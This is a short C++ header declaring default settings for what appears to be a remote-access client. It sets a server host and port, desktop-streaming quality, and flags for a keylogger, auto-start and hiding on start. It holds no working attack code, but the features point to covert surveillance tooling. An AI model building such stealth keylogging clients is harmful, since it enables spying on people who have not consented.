#pragma once
#include <string>
#include <cstdint>

namespace rslm {
	namespace client {
		namespace config {

			struct Settings {
				std::string serverHost = "127.0.0.1";
				uint16_t serverPort = 4782;
				std::string serverPassword = "";

				uint32_t reconnectDelay = 5;

				std::string  clientTag = "RSLM-Client";
				std::string hardwareId = "";

				uint8_t desktopQuality = 75;
				uint8_t desktopFPS = 10;

				bool keyloggerEnable = false;
				bool autoStart = false;
				bool hideOnStart = true;
			};
		}// namespace config
	}// namespace client
}//namespace rslm